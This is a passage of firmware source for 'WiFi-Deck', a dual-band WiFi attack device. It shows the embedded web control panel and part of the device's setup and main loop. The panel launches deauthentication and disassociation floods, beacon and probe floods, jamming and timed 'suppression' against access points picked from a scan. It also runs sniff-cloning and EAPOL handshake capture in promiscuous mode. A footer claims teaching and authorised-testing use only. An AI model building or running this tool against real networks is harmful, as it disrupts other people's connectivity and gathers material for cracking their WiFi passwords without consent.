    <button class="btn btn-dark" onclick="sendCmd('reset_txstats')">🧹 清零TX</button>
  </div>
  <button class="btn btn-success" onclick="sendCmd('stop')">⏹️ 紧急停止所有任务 (STOP ALL)</button>
</div>

<div class="page" id="page-sniff">
  <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
    💡 网页端开启抓包时会自动进入混杂模式 15 秒（热点将暂时中断），结束后自动恢复 WiFi 热点并回读捕获报文。
  </div>
  <div class="banner" id="sniffReconnectBanner"></div>
  <div class="grid2">
    <button class="btn btn-info" onclick="startWebSniff('all')">👁️ 15s 抓包 (ALL)</button>
    <button class="btn btn-warning" onclick="startWebSniff('eapol')">🔑 15s 抓包 (EAPOL)</button>
    <button class="btn btn-dark" onclick="startWebSniff('deauth')">🚨 15s 抓包 (Deauth)</button>
    <button class="btn btn-dark" onclick="startWebSniff('probe')">📡 15s 抓包 (Probe)</button>
  </div>
  <div class="row">
    <button class="btn btn-dark" id="btnHopOn" onclick="sendCmd('hop on')">📺 跳频: 开</button>
    <button class="btn btn-dark" id="btnHopOff" onclick="sendCmd('hop off')">📺 跳频: 关</button>
    <button class="btn btn-dark" onclick="copyLogs()">📋 复制日志</button>
    <button class="btn btn-dark" onclick="clearWebLogs()">🗑️ 清空</button>
  </div>
  <div class="term" id="logBox"><div style="color:#6e7681;text-align:center;padding-top:90px">暂无抓包记录，点击上方按钮开始捕获</div></div>
</div>

<div class="page" id="page-config">
  <div class="config-row"><span class="config-label">BLE 蓝牙名称 (1~26B)</span><input class="config-input" type="text" maxlength="26" id="cfgBleName" value="WiFi-Deck"></div>
  <div class="config-row"><span class="config-label">WiFi 热点名称 (1~32B)</span><input class="config-input" type="text" maxlength="32" id="cfgApSsid" value="WiFi-Deck"></div>
  <div class="config-row"><span class="config-label">WiFi 热点密码 (8~63位)</span><input class="config-input" type="password" maxlength="63" id="cfgApPass" value="" placeholder="留空表示不修改" autocomplete="new-password"></div>
  <div style="font-size:11px;color:#8b949e;padding:2px 4px 4px">🔒 当前热点密码不以明文回显；留空保存则维持原密码不变。如需永久关闭热点请改用 BLE App 或串口。</div>
  <div class="config-row"><span class="config-label">攻击间隔 (100~60000ms)</span><input class="config-input" type="number" min="100" max="60000" id="cfgCycleDelay" value="2000"></div>
  <div class="config-row"><span class="config-label">扫描时间 (500~30000ms)</span><input class="config-input" type="number" min="500" max="30000" id="cfgScanTime" value="5000"></div>
  <div class="config-row"><span class="config-label">单次突发帧数 (1~100)</span><input class="config-input" type="number" min="1" max="100" id="cfgNumFrames" value="3"></div>
  <div class="config-row"><span class="config-label">起始信道 (1 或 36~165)</span><input class="config-input" type="number" min="1" max="165" id="cfgStartChannel" value="1"></div>
  <div class="config-row"><span class="config-label">循环间重扫</span><select class="config-input" id="cfgScanCycles"><option value="off">关</option><option value="on">开</option></select></div>
  <div class="config-row"><span class="config-label">板载 LED 指示灯</span><select class="config-input" id="cfgLed"><option value="on">开</option><option value="off">关</option></select></div>
  <button class="btn btn-primary" onclick="saveConfig()">💾 保存配置 (写入 Flash 掉电记忆)</button>
  <button class="btn btn-dark" onclick="resetDefaultConfig()">🔄 恢复出厂默认配置</button>
  <div class="stat-card" style="margin-top:8px"><div class="stat-val" id="cfgUptime">--</div><div class="stat-label">系统运行时间</div></div>
  <div class="footer">WiFi-Deck | Dual-Band 802.11 Protocol Analyzer<br>⚠️ 仅用于无线网络安全教学与合法授权测试</div>
</div>
<div class="modal-mask" id="confirmMask">
  <div class="modal-card">
    <div class="modal-title" id="confirmTitle">操作确认</div>
    <div class="modal-body" id="confirmBody"></div>
    <div class="grid2">
      <button class="btn btn-dark" onclick="closeConfirm(false)">取消</button>
      <button class="btn btn-primary" onclick="closeConfirm(true)">继续执行</button>
    </div>
  </div>
</div>
<div class="toast" id="toast"></div>
<script>
const API='/api';
let selectedIndices=new Set(),scanCache=null,bandFilter='ALL',sortMode='RSSI',cachedLogs=[];
let curAtkState={deauth:false,disassoc:false,clone:false,hopping:false,targetMode:false,bleConnected:false};
let selectionDirty=false,lastServerScanCount=-1,lastServerTargetCount=-1;
let statsInFlight=false,logsInFlight=false,reconnectingAP=false,reconnectTimer=null,reconnectSeq=0,confirmResolver=null;
function showPage(p){
  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['scan','attack','sniff','config'][i]===p));
  document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active'));
  document.getElementById('page-'+p).classList.add('active');
  if(p==='attack')updateAttackStats();
  if(p==='sniff')fetchLogs();
  if(p==='config')initStatus(false);
}
function toast(msg){let t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2400);}
function showConfirm(title,body){
  document.getElementById('confirmTitle').textContent=title;
  document.getElementById('confirmBody').textContent=body;
  document.getElementById('confirmMask').classList.add('show');
  return new Promise(res=>{confirmResolver=res;});
}
function closeConfirm(ok){
  document.getElementById('confirmMask').classList.remove('show');
  if(confirmResolver){let r=confirmResolver;confirmResolver=null;r(!!ok);}
}
async function fetchAPI(url,opts={},timeoutMs=3500){
  let ctrl=typeof AbortController!=='undefined'?new AbortController():null;
  let timer=ctrl?setTimeout(()=>ctrl.abort(),timeoutMs):null;
  try{
    let reqOpts=ctrl?Object.assign({},opts,{signal:ctrl.signal}):opts;
    let r=await fetch(url,reqOpts);
    let data=null;
    try{data=await r.json();}catch(e){data=null;}
    return{ok:r.ok,status:r.status,data,aborted:false};
  }catch(e){
    return{ok:false,status:0,data:null,aborted:(e&&e.name==='AbortError')};
  }finally{
    if(timer)clearTimeout(timer);
  }
}
async function fetchJSON(url,opts={},timeoutMs=3500){
  let res=await fetchAPI(url,opts,timeoutMs);
  return res.ok?res.data:null;
}
async function syncScanFromServer(){
  let res=await fetchAPI(API+'/scan',{},4000);
  if(res.ok&&res.data){
    scanCache=res.data;
    lastServerScanCount=res.data.count||0;
    if(!selectionDirty){
      selectedIndices.clear();
      let srvTargets=0;
      (res.data.networks||[]).forEach(n=>{if(n.selected){selectedIndices.add(n.index);srvTargets++;}});
      lastServerTargetCount=srvTargets;
    }
    renderNetworks();
  }
}
async function doScan(){
  if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
  let rawScan=Number(document.getElementById('cfgScanTime').value);
  let scanMs=(Number.isFinite(rawScan)&&rawScan>=500)?rawScan:5000;
  let scanSec=Number((scanMs/1000).toFixed(1));
  let scanLoadEl=document.getElementById('scanLoading');
  scanLoadEl.textContent=`正在扫描 2.4GHz & 5GHz 频段... (约 ${scanSec} 秒)`;
  scanLoadEl.classList.add('show');
  document.getElementById('netList').innerHTML='';
  selectedIndices.clear();
  selectionDirty=false;
  let timeoutMs=Math.max(10000,scanMs+5000);
  let res=await fetchAPI(API+'/scan',{method:'POST'},timeoutMs);
  if(!res.ok){
    toast('扫描失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
    scanLoadEl.classList.remove('show');
    return;
  }
  await syncScanFromServer();
  if(scanCache)toast('扫描完成: '+scanCache.count+' 个网络');
  scanLoadEl.classList.remove('show');
  updateAttackStats();
}
function setBand(b){
  bandFilter=b;
  document.getElementById('flt-all').classList.toggle('active',b==='ALL');
  document.getElementById('flt-24').classList.toggle('active',b==='2.4G');
  document.getElementById('flt-5').classList.toggle('active',b==='5G');
  renderNetworks();
}
function setSort(s){
  sortMode=s;
  document.getElementById('srt-rssi').classList.toggle('active',s==='RSSI');
  document.getElementById('srt-ch').classList.toggle('active',s==='CH');
  renderNetworks();
}
function getFilteredNetworks(){
  if(!scanCache||!scanCache.networks)return[];
  let q=(document.getElementById('searchBox').value||'').trim().toLowerCase();
  return scanCache.networks.filter(n=>{
    let bOk=bandFilter==='ALL'||(bandFilter==='5G'?n.channel>=36:n.channel<36);
    let qOk=!q||(n.ssid||'').toLowerCase().includes(q)||(n.bssid||'').toLowerCase().includes(q);
    return bOk&&qOk;
  }).sort((a,b)=>sortMode==='RSSI'?(b.rssi-a.rssi):(a.channel-b.channel));
}
function updateTargetDisplays(){
  let cnt=selectionDirty?selectedIndices.size:(lastServerTargetCount>=0?lastServerTargetCount:selectedIndices.size);
  document.getElementById('topTargets').textContent=cnt;
  document.getElementById('statTargets').textContent=cnt;
}
function renderNetworks(){
  if(!scanCache){
    syncScanFromServer().then(()=>updateAttackStats());
    return;
  }
  let nets=scanCache.networks||[];
  let c24=nets.filter(n=>n.channel<36).length,c5=nets.filter(n=>n.channel>=36).length;
  document.getElementById('flt-all').textContent=`全部 (${nets.length})`;
  document.getElementById('flt-24').textContent=`2.4G (${c24})`;
  document.getElementById('flt-5').textContent=`5G (${c5})`;
  document.getElementById('topAps').textContent=nets.length;
  updateTargetDisplays();
  let list=getFilteredNetworks(),html='';
  list.forEach(n=>{
    let pct=Math.max(8,Math.min(100,Math.round((n.rssi+100)*1.5)));
    let cls=n.rssi>=-60?'good':(n.rssi>=-75?'mid':'bad');
    let bandCls=n.channel>=36?'band5':'band24';
    let bandTxt=n.channel>=36?'5G':'2.4G';
    let sel=selectedIndices.has(n.index)?'selected':'';
    html+=`<div class="net-item ${sel}" onclick="toggleNet(${n.index})"><div class="net-info"><div class="net-ssid">${escHtml(n.ssid||'(隐藏 SSID)')}<span class="net-band ${bandCls}">${bandTxt}</span></div><div class="net-meta">#${n.index} · CH ${n.channel} · ${n.bssid} · ${n.rssi} dBm</div><div class="bar"><div class="bar-fill ${cls}" style="width:${pct}%"></div></div></div><div class="net-check"></div></div>`;
  });
  if(!html)html='<p style="text-align:center;color:#6e7681;padding:28px">暂无匹配热点，请点击右上角扫描</p>';
  document.getElementById('netList').innerHTML=html;
}
function toggleNet(idx){if(selectedIndices.has(idx))selectedIndices.delete(idx);else selectedIndices.add(idx);selectionDirty=true;renderNetworks();}
function selectAllVisible(){getFilteredNetworks().forEach(n=>selectedIndices.add(n.index));selectionDirty=true;renderNetworks();toast('已勾选 '+selectedIndices.size+' 个目标');}
function clearSelection(){selectedIndices.clear();selectionDirty=true;renderNetworks();}
function getAtomicTargetSpec(){
  if(scanCache&&scanCache.networks&&scanCache.networks.length>0&&selectedIndices.size===scanCache.networks.length){
    return 'all';
  }
  return Array.from(selectedIndices).sort((a,b)=>a-b).join(',');
}
async function setTargets(){
  let indices=Array.from(selectedIndices).sort((a,b)=>a-b).join(',');
  let res=await fetchAPI(API+'/target?indices='+encodeURIComponent(indices),{method:'POST'},3500);
  if(res.ok&&res.data&&res.data.status==='ok'){
    selectionDirty=false;
    lastServerTargetCount=res.data.targets||0;
    updateTargetDisplays();
    return true;
  }
  toast('目标同步失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
  return false;
}
async function startAttack(cmd){
  if(cmd==='start deauther'&&curAtkState.deauth){await sendCmd('stop');return;}
  if(cmd==='disassoc'&&curAtkState.disassoc){await sendCmd('disassoc');return;}
  if(selectedIndices.size===0){toast('请先在扫描页勾选至少一个目标');return;}
  if(!(await setTargets()))return;
  let spec=getAtomicTargetSpec();
  await sendCmd(cmd+' '+spec);
}
async function singleApAttack(){
  if(selectedIndices.size===0){toast('请先在扫描页选择一个目标');return;}
  let firstIdx=Array.from(selectedIndices).sort((a,b)=>a-b)[0];
  await sendCmd('single_ap '+firstIdx);
}
async function timedAttackPreset(ms){
  if(selectedIndices.size===0){toast('请先在扫描页勾选至少一个目标');return;}
  if(!(await setTargets()))return;
  let spec=getAtomicTargetSpec();
  await sendCmd('attack_time '+ms+' '+spec);
}
function escHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));}
async function sendCmd(cmd){
  let res=await fetchAPI(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+encodeURIComponent(cmd)},4000);
  if(res.ok&&res.data&&res.data.status==='ok'){
    toast('已执行: '+cmd);
    setTimeout(updateAttackStats,300);
    return true;
  }
  toast('命令失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
  return false;
}
function setReconnectBanners(msg){
  ['sniffReconnectBanner','atkReconnectBanner'].forEach(id=>{
    let el=document.getElementById(id);
    if(!el)return;
    if(msg){el.textContent=msg;el.classList.add('show');}
    else{el.classList.remove('show');el.textContent='';}
  });
}
function startReconnectCountdown(seconds,onRecovered){
  if(reconnectTimer){clearInterval(reconnectTimer);reconnectTimer=null;}
  let mySeq=++reconnectSeq;
  reconnectingAP=true;
  let rem=seconds;
  setReconnectBanners(`⏳ 热点已暂停用于混杂模式，约 ${rem} 秒后自动恢复并回读数据...`);
  reconnectTimer=setInterval(async()=>{
    if(mySeq!==reconnectSeq){clearInterval(reconnectTimer);reconnectTimer=null;return;}
    if(rem>0){
      rem--;
      setReconnectBanners(rem>0?`⏳ 热点已暂停用于混杂模式，约 ${rem} 秒后自动恢复...`:'🔄 正在重连热点并回读数据...');
      return;
    }
    clearInterval(reconnectTimer);reconnectTimer=null;
    for(let attempt=0;attempt<12;attempt++){
      if(mySeq!==reconnectSeq)return;
      let st=await fetchAPI(API+'/status',{},2000);
      if(mySeq!==reconnectSeq)return;
      if(st.ok&&st.data&&!st.data.sniffing){
        reconnectingAP=false;
        setReconnectBanners('');
        toast('热点已重连');
        if(onRecovered)await onRecovered();
        return;
      }
      setReconnectBanners(`🔄 等待手机重新连回热点并恢复通信 (${attempt+1}/12)...`);
      await new Promise(r=>setTimeout(r,1500));
    }
    if(mySeq!==reconnectSeq)return;
    reconnectingAP=false;
    setReconnectBanners('⚠️ 自动重连超时，请确认手机已重新连上设备热点后刷新页面。');
  },1000);
}
async function startBleWaitRecovery(onRecovered){
  if(reconnectTimer){clearInterval(reconnectTimer);reconnectTimer=null;}
  let mySeq=++reconnectSeq;
  reconnectingAP=true;
  setReconnectBanners('⏳ 当前已连蓝牙 App，热点已暂停，请在 App 内停止后自动恢复...');
  await new Promise(r=>setTimeout(r,1500));
  while(reconnectingAP&&mySeq===reconnectSeq){
    let st=await fetchAPI(API+'/status',{},1800);
    if(mySeq!==reconnectSeq)return;
    if(st.ok&&st.data&&!st.data.sniffing&&!st.data.deauth_sniff){
      reconnectingAP=false;
      setReconnectBanners('');
      toast('热点已重连');
      if(onRecovered)await onRecovered();
      return;
    }
    await new Promise(r=>setTimeout(r,2000));
  }
}
async function startWebSniff(mode){
  if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
  let confirmed=await showConfirm('抓包模式提示','启用 15 秒抓包会将设备切换至混杂监听模式，期间设备热点及本网页会暂时断开，结束后自动恢复热点并回读捕获报文。是否继续？');
  if(!confirmed)return;
  let cmd='sniff_time 15000 '+mode;
  let res=await fetchAPI(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+encodeURIComponent(cmd)},3500);
  if(!res.ok){
    toast('启动抓包失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
    return;
  }
  toast('已开启 15s 抓包，热点将在抓包结束后自动恢复');
  startReconnectCountdown(15,async()=>{await fetchLogs();await updateAttackStats();});
}
async function startSniffClone(){
  if(curAtkState.clone){await sendCmd('stop');return;}
  if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
  let st=await fetchJSON(API+'/status',{},1500);
  let bleConn=st?!!st.ble_connected:!!curAtkState.bleConnected;
  if(st)curAtkState.bleConnected=bleConn;
  let confirmMsg=bleConn
    ?'当前已连蓝牙 App，启用后热点将暂停并持续监听，请在 App 内停止后自动恢复。是否继续？'
    :'启用 Deauth 嗅探克隆将暂停设备热点并进入混杂监听。未连接蓝牙控制端时约 15 秒后自动恢复热点；如已连接蓝牙 App 可在 App 内随时停止。是否继续？';
  let confirmed=await showConfirm('嗅探克隆提示',confirmMsg);
  if(!confirmed)return;
  let stAfter=await fetchJSON(API+'/status',{},1000);
  if(stAfter){bleConn=!!stAfter.ble_connected;curAtkState.bleConnected=bleConn;}
  let res=await fetchAPI(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd=deauth_sniff'},3500);
  if(!res.ok){
    toast('启动失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
    return;
  }
  if(bleConn){
    toast('当前已连蓝牙 App，热点已暂停，请在 App 内停止后自动恢复');
    startBleWaitRecovery(async()=>{await updateAttackStats();});
  }else{
    toast('Deauth 嗅探克隆已启动，热点将在恢复后重连');
    startReconnectCountdown(15,async()=>{await updateAttackStats();});
  }
}
async function fetchLogs(){
  if(logsInFlight||reconnectingAP)return;
  logsInFlight=true;
  try{
    let d=await fetchJSON(API+'/logs',{},3500);
    if(!d||!d.logs)return;
    cachedLogs=d.logs;
    let box=document.getElementById('logBox');
    if(cachedLogs.length===0){box.innerHTML='<div style="color:#6e7681;text-align:center;padding-top:90px">暂无抓包记录，点击上方按钮开始捕获</div>';return;}
    box.innerHTML=cachedLogs.map((l,i)=>{
      let cls=l.includes('EAPOL')?'log-eapol':(l.includes('Deauth')||l.includes('Disassoc')?'log-deauth':'');
      return `<div class="log-line ${cls}">${String(i+1).padStart(2,'0')} ${escHtml(l)}</div>`;
    }).join('');
    box.scrollTop=box.scrollHeight;
  }finally{
    logsInFlight=false;
  }
}
async function clearWebLogs(){
  let res=await fetchAPI(API+'/logs/clear',{method:'POST'},3500);
  if(res.ok){
    cachedLogs=[];
    await fetchLogs();
    toast('已清空抓包日志');
  }else{
    toast('清空失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
  }
}
function utf8ByteLen(s){return typeof TextEncoder!=='undefined'?new TextEncoder().encode(s).length:unescape(encodeURIComponent(s)).length;}
function copyTextFallback(text,okMsg){
  let ta=document.createElement('textarea');
  ta.value=text;ta.setAttribute('readonly','');
  ta.style.cssText='position:fixed;left:-9999px;top:0;opacity:0';
  document.body.appendChild(ta);ta.select();ta.setSelectionRange(0,text.length);
  let ok=false;
  try{ok=document.execCommand('copy');}catch(e){ok=false;}
  document.body.removeChild(ta);
  toast(ok?okMsg:'当前浏览器不支持自动复制，请长按日志手动复制');
}
function copyLogs(){
  if(!cachedLogs.length){toast('暂无日志可复制');return;}
  let text=cachedLogs.join('\n'),okMsg='已复制 '+cachedLogs.length+' 条记录';
  if(navigator.clipboard&&window.isSecureContext){
    navigator.clipboard.writeText(text).then(()=>toast(okMsg)).catch(()=>copyTextFallback(text,okMsg));
  }else{
    copyTextFallback(text,okMsg);
  }
}
async function updateAttackStats(){
  updateTargetDisplays();
  if(statsInFlight||reconnectingAP)return;
  statsInFlight=true;
  try{
    let d=await fetchJSON(API+'/status',{},2500);
    if(d){
      let srvScan=Number(d.scan_count||0);
      let srvTarget=Number(d.target_count||0);
      let needScanSync=!selectionDirty&&(srvScan!==lastServerScanCount||srvTarget!==lastServerTargetCount);
      lastServerScanCount=srvScan;
      lastServerTargetCount=srvTarget;
      updateTargetDisplays();

      document.getElementById('topCh').textContent=d.current_channel||'--';
      document.getElementById('statCh').textContent=d.current_channel||'--';
      document.getElementById('topAps').textContent=srvScan;
      document.getElementById('topTxOk').textContent=d.tx_ok||0;
      document.getElementById('statTxOk').textContent=d.tx_ok||0;
      document.getElementById('topTxFail').textContent=d.tx_fail||0;
      curAtkState.deauth=!!d.attack_enabled;
      curAtkState.disassoc=!!d.disassoc_enabled;
      curAtkState.clone=!!d.deauth_sniff;
      curAtkState.hopping=!!d.hopping;
      curAtkState.targetMode=!!d.target_mode;
      curAtkState.bleConnected=!!d.ble_connected;
      document.getElementById('btnDeauth').classList.toggle('running',curAtkState.deauth);
      document.getElementById('btnDisassoc').classList.toggle('running',curAtkState.disassoc);
      document.getElementById('btnBcn').classList.toggle('running',!!d.beacon_flood);
      document.getElementById('btnPrb').classList.toggle('running',!!d.probe_flood);
      document.getElementById('btnJam').classList.toggle('running',!!d.signal_jam);
      document.getElementById('btnClone').classList.toggle('running',curAtkState.clone);
      let bHopOn=document.getElementById('btnHopOn'),bHopOff=document.getElementById('btnHopOff');
      if(bHopOn&&bHopOff){bHopOn.classList.toggle('running',curAtkState.hopping);bHopOff.classList.toggle('running',!curAtkState.hopping);}
      let tb=document.getElementById('timedBanner');
      if(tb){
        if(d.timed_attack&&d.timed_remaining>0){
          tb.textContent=`⏱️ 定时压制进行中，剩余 ${Math.ceil(d.timed_remaining/1000)} 秒`;
          tb.classList.add('show');
        }else{
          tb.classList.remove('show');
        }
      }
      let dot=document.getElementById('statusDot');
      dot.className='status-dot';
      if(d.attack_enabled||d.disassoc_enabled||d.beacon_flood||d.probe_flood||d.signal_jam||d.deauth_sniff)dot.classList.add('attacking');
      else if(d.sniffing)dot.classList.add('active');
      let s=Math.floor(d.uptime/1000),m=Math.floor(s/60),h=Math.floor(m/60);
      document.getElementById('cfgUptime').textContent=h+'h '+(m%60)+'m '+(s%60)+'s';
      let nextSsid=d.ssid||'',nextBle=d.ble_name||'';
      if((nextSsid&&nextSsid!==syncedSsid)||(nextBle&&nextBle!==syncedBle)){
        syncedSsid=nextSsid;syncedBle=nextBle;
        applyHeaderIdentity(nextSsid,nextBle);
        initStatus(false);
      }else if(nextSsid||nextBle){
        applyHeaderIdentity(nextSsid,nextBle);
      }
      if(needScanSync)syncScanFromServer();
    }
  }finally{
    statsInFlight=false;
  }
}
let loadedBleName='WiFi-Deck',loadedApSsid='WiFi-Deck';
let syncedSsid='',syncedBle='',dirtyFields=new Set();
function setCfgField(id,val){if(!dirtyFields.has(id))document.getElementById(id).value=val;}
function applyHeaderIdentity(ssid,ble){
  let title=ssid||ble||'WiFi-Deck';
  document.getElementById('hdrName').textContent=title;
  document.title=title+' · 控制台';
}
async function saveConfig(){
  let bleName=document.getElementById('cfgBleName').value.trim();
  let ssid=document.getElementById('cfgApSsid').value.trim();
  let pass=document.getElementById('cfgApPass').value.trim();
  let cycleDelay=Number(document.getElementById('cfgCycleDelay').value);
  let scanTime=Number(document.getElementById('cfgScanTime').value);
  let numFrames=Number(document.getElementById('cfgNumFrames').value);
  let startCh=Number(document.getElementById('cfgStartChannel').value);
  let sendBle=dirtyFields.has('cfgBleName')||bleName!==loadedBleName;
  let sendSsid=dirtyFields.has('cfgApSsid')||ssid!==loadedApSsid;
  let sendPass=pass.length>0;
  let bleLen=utf8ByteLen(bleName),ssidLen=utf8ByteLen(ssid),passLen=utf8ByteLen(pass);
  if(sendBle&&(bleLen<1||bleLen>26)){toast('BLE 名称需为 1~26 字节');return;}
  if(sendSsid&&(ssidLen<1||ssidLen>32)){toast('WiFi 热点名称需为 1~32 字节');return;}
  if(sendPass&&(passLen<8||passLen>63)){toast('WiFi 密码需为 8~63 字符/字节');return;}
  if(!Number.isInteger(cycleDelay)||cycleDelay<100||cycleDelay>60000){toast('攻击间隔需在 100~60000 ms');return;}
  if(!Number.isInteger(scanTime)||scanTime<500||scanTime>30000){toast('扫描时间需在 500~30000 ms');return;}
  if(!Number.isInteger(numFrames)||numFrames<1||numFrames>100){toast('单次突发帧数需在 1~100');return;}
  if(!Number.isInteger(startCh)||!(startCh===1||(startCh>=36&&startCh<=165))){toast('起始信道需为 1 或 36~165');return;}
  let credsChanged=(sendSsid&&ssid!==loadedApSsid)||sendPass;
  let parts=[];
  if(sendBle)parts.push('ble_name='+encodeURIComponent(bleName));
  if(sendSsid)parts.push('ap_ssid='+encodeURIComponent(ssid));
  if(sendPass)parts.push('ap_pass='+encodeURIComponent(pass));
  parts.push('cycle_delay='+cycleDelay,'scan_time='+scanTime,'num_frames='+numFrames,'start_channel='+startCh,'scan_cycles='+document.getElementById('cfgScanCycles').value,'led='+document.getElementById('cfgLed').value);
  let body=parts.join('&');
  let res=await fetchAPI(API+'/config',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body},4000);
  let data=res.data;
  if(res.ok&&data&&data.status==='ok'){
    dirtyFields.clear();
    if(sendBle){loadedBleName=bleName;syncedBle=bleName;}
    if(sendSsid){loadedApSsid=ssid;syncedSsid=ssid;}
    if(sendPass)document.getElementById('cfgApPass').value='';
    applyHeaderIdentity(loadedApSsid,loadedBleName);
    toast((data.ap_restarted||credsChanged)?'配置已保存，热点正按新名称/密码重启，请重新连接 WiFi':'配置已保存至 Flash');
  }else if(data&&data.message){
    toast('保存失败: '+data.message);
  }else if(credsChanged){
    dirtyFields.clear();
    if(sendSsid){loadedApSsid=ssid;syncedSsid=ssid;}
    if(sendPass)document.getElementById('cfgApPass').value='';
    applyHeaderIdentity(loadedApSsid,loadedBleName);
    toast('热点凭据已更新并重启，请重新连接新 WiFi');
  }else{
    toast('配置保存请求失败，请检查热点连接');
  }
}
async function resetDefaultConfig(){
  dirtyFields.clear();
  document.getElementById('cfgApPass').value='';
  await sendCmd('reset_config');
  [500,1500,3500].forEach(ms=>setTimeout(()=>initStatus(true),ms));
}
async function initStatus(force=false){
  let data=await fetchJSON(API+'/info',{},3500);
  if(data){
    if(force){dirtyFields.clear();document.getElementById('cfgApPass').value='';}
    if(data.ble_name){loadedBleName=data.ble_name;syncedBle=data.ble_name;setCfgField('cfgBleName',data.ble_name);}
    if(data.ssid){loadedApSsid=data.ssid;syncedSsid=data.ssid;setCfgField('cfgApSsid',data.ssid);}
    applyHeaderIdentity(data.ssid,data.ble_name);
    setCfgField('cfgCycleDelay',data.cycle_delay);
    setCfgField('cfgScanTime',data.scan_time);
    setCfgField('cfgNumFrames',data.num_frames);
    setCfgField('cfgStartChannel',data.start_channel);
    setCfgField('cfgScanCycles',data.scan_between_cycles?'on':'off');
    setCfgField('cfgLed',data.led?'on':'off');
  }
}
window.onload=()=>{
  document.querySelectorAll('#page-config input, #page-config select').forEach(el=>
    el.addEventListener(el.tagName==='SELECT'?'change':'input',()=>dirtyFields.add(el.id))
  );
  renderNetworks();initStatus(true);updateAttackStats();
  setInterval(()=>{
    if(reconnectingAP)return;
    updateAttackStats();
    if(document.getElementById('page-sniff').classList.contains('active'))fetchLogs();
  },2500);
};
</script>
</body>
</html>)=====";

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);

  uint32_t bootReason = BOOT_Reason();
  char bootMsg[160];
  snprintf(bootMsg, sizeof(bootMsg),
           "[BOOT] ResetReason=0x%08lX (WDG=%d KM4WDG=%d SYS=%d KM4SYS=%d BOD=%d DSLP=%d) FreeHeap=%luB",
           (unsigned long)bootReason,
           (bootReason & BIT_BOOT_WDG_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_KM4WDG_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_SYS_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_KM4SYS_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_BOD_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_DSLP_RESET_HAPPEN) ? 1 : 0,
           (unsigned long)xPortGetFreeHeapSize());
  Serial.println(bootMsg);

  wdt_enable(8000);

  scanMutex = xSemaphoreCreateMutex();
  if (scanMutex == NULL) {
    Serial.println("[ERROR] Failed to create scanMutex!");
  }

  loadConfigFromFlash();
  feedWatchdog();

  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  if (USE_LED) {
    digitalWrite(LED_R, HIGH); delay(100); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(100); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(100); digitalWrite(LED_B, LOW);
  }
  feedWatchdog();

  Serial.println("=== WiFi-Deck ===");
  Serial.println("[INFO] Starting WiFi AP (non-hidden)...");

  // Start AP in non-hidden mode so phones can discover it
  bool apReady = startSoftAP();
  feedWatchdog();

  if (apReady) {
    Serial.print("[INFO] AP started: ");
    Serial.println(ap_ssid);
    Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
    Serial.println("[INFO] Web server started on port 80");
  } else {
    Serial.println("[ERROR] Initial SoftAP / WebServer startup failed (self-heal armed).");
  }

  // Start BLE UART service for the Android App
  setupBLE();
  feedWatchdog();

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  feedWatchdog();

  // BLE 异常掉线复位：连接断开后若未收到 CCCD 取消订阅回调，bleNotifyEnabled 会残留为 true，
  // 导致对不存在的连接反复 notify
  uint8_t bleConnSnap = 0;
  bool bleNotifySnap = false;
  getBleStateSafe(bleConnSnap, bleNotifySnap);
  if (bleNotifySnap && !BLE.connected(bleConnSnap)) {
    rtw_enter_critical(NULL, NULL);
    if (activeConnId == bleConnSnap) {
      bleNotifyEnabled = false;
    }
    rtw_exit_critical(NULL, NULL);
    resetBleLogFlowControl();
  }

  processBleDiagAndNegotiation();
  ensureBleAdvertisingIfDisconnected();

  // 优先响应来自任意通道的急停标志，避免旧排队指令阻塞停机
  consumePriorityStopIfPending();

  bool warnOverflow = false;
  bool warnOversize = false;
  rtw_enter_critical(NULL, NULL);
  if (bleCmdQueueOverflow) {
    bleCmdQueueOverflow = false;
    warnOverflow = true;
  }
  if (bleCmdOversizeDrop) {
    bleCmdOversizeDrop = false;
    warnOversize = true;
  }
  rtw_exit_critical(NULL, NULL);
  if (warnOverflow) {
    Serial.println("[WARN] BLE command ring full; dropped oldest overflow command.");
    bleSendLog("[WARN] BLE 指令队列已满，部分指令被丢弃");
  }
  if (warnOversize) {
    Serial.println("[ERROR] BLE command exceeds max payload length (219B); rejected.");
    bleSendLog("[ERROR] BLE 单条指令超过 219B 上限，已拒绝");
  }

  // Handle commands from Serial via non-blocking line buffer
  pollSerialInput();
  while (serialCmdTail != serialCmdHead) {
    if (consumePriorityStopIfPending()) break;
    char sCmdBuf[BLE_BUF_SIZE];
    strncpy(sCmdBuf, serialCmdQueue[serialCmdTail], sizeof(sCmdBuf) - 1);
    sCmdBuf[sizeof(sCmdBuf) - 1] = '\0';
